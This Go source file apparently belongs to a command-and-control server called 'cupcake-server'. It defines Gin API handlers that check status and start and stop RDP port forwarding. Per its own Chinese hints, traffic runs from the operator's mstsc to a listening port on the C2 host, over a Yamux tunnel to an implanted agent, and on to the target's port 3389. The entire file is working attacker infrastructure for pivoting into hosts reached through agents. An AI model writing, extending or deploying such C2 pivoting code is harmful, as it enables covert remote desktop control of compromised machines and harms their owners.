package controllers

import (
	"errors"
	"log"
	"net/http"
	"strconv"

	"cupcake-server/pkg/globals"
	"cupcake-server/services"

	"github.com/gin-gonic/gin"
)

// DesktopStatus GET /api/desktop/:uuid/status
// RDP port-forward status. Agent path: Yamux DESKTOP + L2 module "desktop".
func DesktopStatus(c *gin.Context) {
	uuidStr := c.Param("uuid")
	val, ok := globals.Clients.Load(uuidStr)
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{
			"error":         "agent offline",
			"desktop_ready": false,
			"mode":          "rdp",
		})
		return
	}
	client := val.(*globals.Client)
	hasYamux := client.YamuxSession != nil && !client.YamuxSession.IsClosed()
	transport := client.Transport
	if transport == "" {
		if client.TCPConn != nil || hasYamux {
			transport = "tcp"
		} else {
			transport = "websocket"
		}
	}

	out := gin.H{
		"uuid":           uuidStr,
		"transport":      transport,
		"yamux":          hasYamux,
		"desktop_ready":  hasYamux,
		"desktop_busy":   services.HasDesktopSession(uuidStr),
		"ws_unsupported": true, // browser canvas path retired
		"mode":           "rdp",
		"module_required": true,
		"module_id":      "desktop",
		"module_hint":    "两步操作：① 模块面板加载 L2「desktop」② 本页启动 RDP 转发。流量：mstsc → C2 监听端口 → Yamux DESKTOP(0x0D) → Agent → 目标:3389。需 TCP Yamux Agent。",
		"default_target": "127.0.0.1",
		"default_port":   3389,
	}

	if s := services.GetDesktopSession(uuidStr); s != nil {
		out["rdp_active"] = true
		out["listen_host"] = s.ListenHost
		out["listen_port"] = s.ListenPort
		out["target_host"] = s.TargetHost
		out["target_port"] = s.TargetPort
		out["bind"] = s.Bind
		// Operator connects mstsc to the C2 host (or SSH-tunneled localhost).
		out["connect_hint"] = "mstsc /v:<C2主机IP>:" + strconv.Itoa(s.ListenPort)
		out["opened_at"] = s.OpenedAt
	} else {
		out["rdp_active"] = false
	}

	c.JSON(http.StatusOK, out)
}

// StartDesktopRDP POST /api/desktop/:uuid/start
// Body: { "target_host": "127.0.0.1", "target_port": 3389, "listen_port": 0 }
func StartDesktopRDP(c *gin.Context) {
	uuidStr := c.Param("uuid")
	var req struct {
		TargetHost string `json:"target_host"`
		TargetPort int    `json:"target_port"`
		ListenPort int    `json:"listen_port"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		// empty body ok — defaults
		req.TargetHost = "127.0.0.1"
		req.TargetPort = 3389
		req.ListenPort = 0
	}
	if req.TargetHost == "" {
		req.TargetHost = "127.0.0.1"
	}
	if req.TargetPort <= 0 {
		req.TargetPort = 3389
	}

	val, ok := globals.Clients.Load(uuidStr)
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent offline", "code": "offline"})
		return
	}
	client := val.(*globals.Client)
	if client.YamuxSession == nil || client.YamuxSession.IsClosed() {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "bridge_unavailable",
			"code":  "bridge_unavailable",
			"msg":   "RDP forward requires TCP Yamux agent; load L2 module desktop before connecting",
		})
		return
	}

	sess, err := services.StartDesktopRDP(uuidStr, req.TargetHost, req.TargetPort, req.ListenPort)
	if err != nil {
		code := "error"
		status := http.StatusInternalServerError
		if errors.Is(err, services.DesktopBusyError) {
			code = "busy"
			status = http.StatusConflict
		}
		log.Printf("[desktop-rdp] start failed agent=%s: %v", uuidStr, err)
		c.JSON(status, gin.H{"error": err.Error(), "code": code})
		return
	}

	log.Printf("[desktop-rdp] start ok agent=%s listen=%d → %s:%d",
		uuidStr, sess.ListenPort, sess.TargetHost, sess.TargetPort)

	c.JSON(http.StatusOK, gin.H{
		"status":       "success",
		"mode":         "rdp",
		"listen_host":  sess.ListenHost,
		"listen_port":  sess.ListenPort,
		"target_host":  sess.TargetHost,
		"target_port":  sess.TargetPort,
		"bind":         sess.Bind,
		"connect_hint": "mstsc /v:<C2主机IP>:" + strconv.Itoa(sess.ListenPort),
		"msg":          "RDP 端口转发已启动。用 mstsc 连接 C2 主机上的监听端口。",
	})
}

// StopDesktopRDP POST /api/desktop/:uuid/stop
func StopDesktopRDP(c *gin.Context) {
	uuidStr := c.Param("uuid")
	services.StopDesktopRDP(uuidStr)
	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"msg":    "RDP 端口转发已停止",
	})
}
